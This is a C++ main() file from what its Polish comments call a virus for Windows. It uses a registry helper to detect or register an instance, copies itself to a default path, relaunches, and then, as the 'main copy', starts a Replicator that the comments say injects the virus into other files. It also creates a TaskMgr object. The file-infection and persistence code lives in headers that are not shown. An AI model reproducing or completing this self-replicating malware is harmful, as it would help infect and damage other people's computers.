#include <iostream>
#include <windows.h>

#include "RegEditer.h"
#include "Replicator.h"
#include "TaskMgr.h"
#include "Exception.h"

#define null 0

using namespace std;

int main()
{

    // Obsluga rejestru - OK!
    RegEditer *regEditer = new RegEditer();
    try
    {
        if(regEditer->IsRegistered())
        {
            if(!regEditer->IsMainCopy())
            {
                // jest juz zarejestrowana jakas instancja programu w systemie
                // ale nasza nie jest glowna kopia, dlatego konczymy dzialanie
                delete regEditer;

                return 0;
            }

        }
        else
        {
            // nalezy przekopiowac wirusa do jego sciazki domyslnej
            // odpalic nowa instancje
            // a ta zakonczyc
            regEditer->Register();
            delete regEditer;

            return 0;
        }
    }
    catch(Exception e)
    {
        //cout << e.GetMessage() << endl;

        if(regEditer != null )
            delete regEditer;

        system("pause");
        return 0;
    }

    // jestesmy glowna kopia wirusa w systemie dlatego
    // rozpoczynamy replikacje wstrzykujac sie do innych plików

    Replicator *replicator = new Replicator();
    replicator->Start();

    TaskMgr *taskMgr = new TaskMgr();

    cout << "OK!" << endl;

    replicator->Stop();
    system("pause");

    delete taskMgr;
    delete replicator;
    return 0;
}
